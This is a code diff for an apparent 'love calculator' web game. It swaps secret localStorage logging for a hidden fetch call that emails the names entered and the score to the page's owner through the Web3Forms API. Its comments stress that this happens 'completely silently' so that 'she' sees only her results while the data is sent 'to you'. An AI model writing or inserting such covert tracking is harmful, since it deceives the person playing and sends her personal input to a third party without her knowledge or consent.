@@ -145,17 +145,27 @@ function calculateLove() {
         }
     }
 
-    // 3. SECRET LOGGING CODE
-    let matchRecord = {
-        person1: name1Input,
-        person2: name2Input,
-        score: percentText.innerHTML,
-        time: new Date().toLocaleTimeString()
-    };
+    // --- THE NEW SECRET EMAIL CODE ---
+    // Make sure to put your actual Web3Forms key inside the quotes below!
+    const myAccessKey = "PASTE_YOUR_ACCESS_KEY_HERE"; 
 
-    let history = JSON.parse(localStorage.getItem("secretLoveLog")) || [];
-    history.push(matchRecord);
-    localStorage.setItem("secretLoveLog", JSON.stringify(history));
+    fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+            access_key: myAccessKey,
+            subject: "🕵️ Someone played the game!",
+            message: `TEST RESULT: ${name1Input} and ${name2Input} got ${percentText.innerHTML}`
+        })
+    }).then(response => {
+        // We leave this empty so it happens completely silently in the background.
+        // She will just see her results on the screen while the email sends to you.
+    }).catch(error => {
+        console.log("Silent error"); 
+    });
 }
 </script>
 
